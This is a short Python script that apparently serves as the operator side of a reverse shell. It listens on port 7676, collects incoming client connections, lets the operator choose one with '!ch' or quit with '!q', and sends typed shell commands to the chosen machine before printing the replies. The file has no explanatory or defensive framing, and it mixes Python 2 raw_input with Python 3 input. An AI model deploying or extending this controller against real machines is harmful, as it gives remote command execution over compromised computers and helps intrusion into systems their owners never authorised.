# -*- coding:utf-8 -*-
import socket
import threading
clientList = []
curClient = None
quitThread = False
lock = threading.Lock()
def Init():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.bind(('0.0.0.0',7676))
	s.listen(1024)
	return s

def WaitConnect(sk):
	global clientList
	while not quitThread:
		if len(clientList) == 0:
			print('waiting for the connection......')
		sock,addr = sk.accept()
		print('New client %s is connection!' % (addr[0]))
		lock.acquire()
		clientList.append((sock,addr))
		lock.release()

def SelectClient():
	global clientList
	global curClient
	for i in range(len(clientList)):
		print('[%i]->%s' % (i,str(clientList[i][1][0])))
	print('Please select a client')
	while True:
		num = input('client num:')
		if int(num) >= len(clientList):
			print('wrong number!')
			continue
		else:
			break
	curClient = clientList[int(num)]

def ShellCtrl(socket,addr):
	while True:
		com = raw_input(str(addr[0])+':~#')
		print(com)
		if com == '!ch':
			SelectClient()
			return
		if com == '!q':
			exit(0)
		socket.send(com.encode('utf-8'))
		data = socket.recv(1024)
		print(data.decode('utf-8'))

def ClientHandle():
	while True:
		if len(clientList) > 0:
			SelectClient()
			ShellCtrl(curClient[0],curClient[1])
def main():
	s = Init()
	t = threading.Thread(target=WaitConnect,args=(s,))
	t.start()
	t1= threading.Thread(target=ClientHandle)
	t1.start()

if __name__ == '__main__':
	main()

